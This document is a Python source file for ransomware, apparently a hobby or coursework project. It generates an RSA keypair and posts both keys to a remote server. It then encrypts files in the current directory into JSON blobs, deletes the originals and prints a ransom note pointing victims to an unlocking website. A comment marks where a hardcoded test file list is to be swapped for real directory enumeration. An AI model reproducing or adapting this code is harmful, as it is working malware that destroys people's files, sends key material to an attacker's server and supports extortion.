import sys# I think some of these imports are not needed tho...
from pathlib import Path # used for path finding

# a bunch of the cryptography imports
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization

import os# operating system trickery
import cnsts# this is the closest you can get to immutable constants in python3, if fact I think this is the proper way.
import MyRSAEncrypt # this is the module that take the regular keys ans encrypts them with RSA
import MyfileEncryptMAC# opens a file, generates an Hmac thingy, and then calls MyencryptMAC
import MyencryptMAC# the heart of all the cryptomajicks
import pickle# this used to be how I built my encrypted files, not I just use it for controlled conactination
import json# for the record I still think json is dumb and smelly.
import requests# now with internetz
import urllib # this is for the part where we need to do url querying


# this should be the only thing in the program that does any sort of RSA key generation.
def keyGen(): #key generator
	kg = rsa.generate_private_key(public_exponent=65537,key_size=2048,backend=default_backend())
	#pk = private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword'))
	prvkNoENC = kg.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.NoEncryption())
	pubkNoENC = kg.public_key().public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
	
	#open(cnsts.kPrv,"wb").write(prvkNoENC)
	pingData = {}
	pingData["pub"]=pubkNoENC
	pingData["prv"]=prvkNoENC
	requests.post("http://"+cnsts.serverUrl+":"+str(cnsts.serverPort)+"/keys",data=pingData)#TODO: not a todo, this is where we do a post command
	
	open(cnsts.kPub,"wb").write(pubkNoENC)# we only save the public key key

# this is another RSA key related function that just regenrated the public key if it somehow winds up missing. unused in this isntance
def pubKeyFix():
	kData = open(cnsts.kPrv,"rb").read()
	kg = serialization.load_pem_private_key(kData,password=None,backend=default_backend())
	pubkNoENC = kg.public_key().public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
	open(cnsts.kPub,"wb").write(pubkNoENC)# these are both .pem files, I looked it up.

# this is the method that handles what files are to be encrypted, some directory trickery happens here.
def getFilez():

	filez=[]
	for i in os.listdir():
			if(os.path.isfile(i)):
				filez.append(i)
				
	# the below makes sure to omit the running script or executable from the list of stuff.
	try:
		dis = sys.executable[len(os.getcwd()):]# normaly this just shows the python interpreter exe. HOWEVER...
		if(dis[0]=='\\'): dis = dis[1:] # when compiled this points to the actual exe file used in the final product.
		filez.remove(dis)
	except: print('')
	try: filez.remove(__file__)
	except: print('')
	try: filez.remove(cnsts.kPrv)
	except: print('')
	try: filez.remove(cnsts.kPub)
	except: print('')
	try: filez.remove(cnsts.saveData)
	except: print('')
	return filez

# this checks to see if the keys are located where they are supposed to be.
def checkKeys(homeDir,activeDir):
	result = True
	os.chdir(homeDir)
	if(not os.path.isfile(cnsts.saveData)): keyGen() # new file gen
	else: result = False # we apparently did some damage
	os.chdir(activeDir)
	return result

# UNUSED STUFF, MOVE ALONG
def getPrvKey(homeDir,activeDir): # oh hey this does something now loal, it calls the server to save the Private key
	result = True
	os.chdir(homeDir)
	pubKey = open(cnsts.kPub,"rb").read()
	pubKeyPlusFix = urllib.parse.quote(pubKey) # ho boi, if you dont do this bad shit happens.
	cawll = requests.get("http://"+cnsts.serverUrl+":"+str(cnsts.serverPort)+"/keys?pub="+pubKeyPlusFix)
	if(cawll.status_code == 200):
		offLoad = cawll.content
		if(offLoad!=[]):
			prvkNoENC = json.loads(offLoad)[0]["prv"]
			open(cnsts.kPrv,"w").write(prvkNoENC)
		else: result = False
	else: result = False
	os.chdir(activeDir)
	return result
	
def writeToSave(homeDir,activeDir,saveData): #unused function
	os.chdir(homeDir)
	open(cnsts.saveData,"w").write(json.dumps(saveData))
	os.chdir(activeDir)

def loadFromSave(homeDir,activeDir):
	os.chdir(homeDir)
	try: return json.loads(open(cnsts.saveData,"r").read())
	except: return {}
	os.chdir(activeDir)
# ight you can stop moving along
	
# dispite the dumb name this is actually the intermediary encryption function.
def option6(filePath,homeDir,activeDir):
	#print("Select file to encrypt: ",end='')
	#filePath = input()
	#print("Select public key: ",end='')
	#keyPath = input()
	
	f = MyfileEncryptMAC.norm(filePath) #filepath = [C, IV, key,fileDir,fileName,fileExt,tag,HMAC]
	
	# using pickle as a rather silly way of concatinating two "strings", rather two objects.
	# its sole pourpose is to make it so I can get both the key anc HMAC cleanly.
	ccat = pickle.dumps([f[2],f[7]])
	os.chdir(homeDir)# directory change to the home, so I can get the RSA key.
	hh = MyRSAEncrypt.norm(ccat,cnsts.kPub)
	os.chdir(activeDir)# and back
	
	# right here is pretty much where I build the .json file.
	theDict = { # all of these are arrays of int values between 0-255
		'RSACipher':list(hh),
		'C':list(f[0]),
		'IV':list(f[1]),
		'ext':f[5], # this is a string
		'tag':list(f[6])
	}
	
	# last bit where we save the file actually.
	returnName = (f[3]+f[4]+".json")
	json.dump(theDict,open(returnName,'w'),indent=4)
	os.remove(filePath) #delete the file.
	return returnName# this is so when I encrypt some files I can keep track of which ones I encrypted.
	#print("done",end='')
	#input()

# and this is the intermidiary decrypt function, they were called option6 and option7 because they were origonally test driver functions.
# if you are wondering why I didnt refactor any of this, I developed this whole program in notepad++ (and KDE's default notepad editor), its not even a real IDE.
def option7(filePath,homeDir,activeDir):
	#print("Select file to decrypt: ",end='')
	#filePath = input()
	#print("Select private key: ",end='')
	#keyPath = input()
	
	fileObj = open(filePath, "r") #open file, and save the referance for later
	location = filePath.rstrip(os.path.basename(fileObj.name)) #cut off the file's directory
	cutFile = (os.path.basename(fileObj.name)).partition('.') #place the file's name into a list [fileName, ., ext]
	theDict = json.load(fileObj)# rember that dictionary I made some lines ago?, here it is again.
	# gets the above [RSAC, C, IV, ext,tag]
	
	RSAC = bytes(theDict['RSACipher'])# careful, its pickled.
	C = bytes(theDict['C'])
	IV = bytes(theDict['IV'])
	tagData = bytes(theDict['tag'])
	os.chdir(homeDir)# more dir chainging because the RSA keys are elsewhere.
	hh = MyRSAEncrypt.inv(RSAC,cnsts.kPrv)
	os.chdir(activeDir)
	
	# we undo the concatination of the key and HMAC, im to lazy to deal with string splicing trickery.
	gg = pickle.loads(hh)# here is my idea of undoing the concatination, remeber [key, HMAC]
	
	# even though MyFileEcryptMAC has an .inv function I dont use it because it was not designed with .json files in mind.
	buff = MyencryptMAC.inv(C,IV,gg[0],tagData,gg[1])
	
	# we rebuild the origonal file here.
	open((cutFile[0]+'.'+theDict['ext']),"wb").write(buff)
	fileObj.close()# hey you forgot to close this :/
	os.remove(filePath) # delete the json file.
	
	#print("done",end='')
	#input()
	
# our main function
def main():

	# on windows this is %userprofile%, on linux its '~'.
	homeDir = str(Path.home()) # ima save the keys here. and the save data(basically a record of all the locations of the encrypted files.)
	# basically where the exe was run.
	activeDir = os.getcwd() # this value starts off in the dir where the exe was launched.
	
	# find and if nessary bebuild the keys
	fresh = checkKeys(homeDir,activeDir) # returns false if the savedata json exsists, indicating the malware did its thing.
	
	if(fresh):
		
		# get our files to do horrible nasty stoof with.
		#fileList = getFilez()
		fileList = ["img1.png","img2.png","img3.png"] # swap the comments when we really do this.
		hostages = []# this is NOT where the encrypted files are stored, just their names.
		
		# this one liner loop just encrypts all the files
		for i in fileList: hostages.append(option6(i,homeDir,activeDir))# remember this from our test program? its been modified a bit for repeated use.
		
		saveData = {}
		saveData["hostages"] = hostages
		writeToSave(homeDir,activeDir,saveData)
		
		# now that we have the user's files hostage[]. it's time to let them know.
		# yest I intentionally made the print statements ugly.
		print("woopsie, I acedentally all your files into jasons\nif you wana unlock them, goto funniiboiz.me to download the unlocker\n>>>",end='')
		input()
	else:
		print("I think I have made myself clear\ngoto funniiboiz.me to unlock your files\n>>>",end='')
		input()
	
main()# I program python3 like its c++.
